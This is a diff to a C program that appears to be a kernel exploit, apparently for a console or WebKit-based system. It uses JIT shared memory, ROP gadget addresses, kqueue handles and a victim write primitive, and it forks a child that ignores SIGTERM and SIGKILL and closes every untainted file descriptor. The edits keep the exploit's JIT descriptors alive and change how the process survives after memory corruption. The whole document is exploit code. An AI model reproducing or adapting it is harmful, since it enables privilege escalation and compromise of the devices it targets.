@@ -398,7 +398,7 @@ int main()
 {
     if(!setuid(0))
         return 179;
-    char not_close[4096] = {0};
+    char* not_close = ((char*)mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)) + 4096;
     int tmp;
 #define TAINTFD(x) do { tmp = x; not_close[tmp] = 1; } while(0)
 #define NEWSOCK(x) do { x = tmp = new_socket(); not_close[tmp] = 1; } while(0)
@@ -488,7 +488,9 @@ int main()
     int jit1, jit2;
     errno = 0;
     jit1 = jitshm_create(0, 16384, PROT_READ|PROT_WRITE|PROT_EXEC);
+    TAINTFD(jit1);
     jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
+    TAINTFD(jit2);
     printf("jit: %d %d\n", jit1, jit2);
     char* page_rx = mmap(NULL, 16384, PROT_READ|PROT_EXEC, MAP_SHARED, jit1, 0);
     thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x2000000000000000");
@@ -523,9 +525,6 @@ int main()
     write_to_victim(&o, 0);
     for(int i = 0; i < 256; i++)
         close(kq[i]);
-    // fix crash in webkit after running this
-    close(jit1);
-    close(jit2);
     if(!fork())
     {
         struct sigaction ignore = {
@@ -535,8 +534,6 @@ int main()
         };
         sigaction(SIGTERM, &ignore);
         sigaction(SIGKILL, &ignore);
-        /*for(int i = 0; i < 8; i++)
-            close(i);*/
         for(int i = 0; i < 4096; i++)
             if(!not_close[i])
                 if(!close(i))
